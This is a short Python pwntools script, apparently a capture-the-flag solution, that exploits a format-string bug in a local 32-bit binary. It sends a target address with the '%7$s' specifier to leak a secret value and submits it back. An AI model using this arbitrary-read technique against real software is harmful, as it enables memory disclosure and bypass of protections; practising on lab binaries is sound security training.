#!/usr/bin/env python

from pwn import *

p = process('fs-arbt-read-32')

print(p.recv())

random_value_addr = p.elf.symbols['random_value']

p.sendline(p32(random_value_addr)+ "\n%7$s")

data = p.recv()
print(repr(data))

addr = data.split('\n')[1][:4]

print(addr)

addr = u32(addr)

print(hex(addr))

p.sendline(hex(addr))
p.interactive()
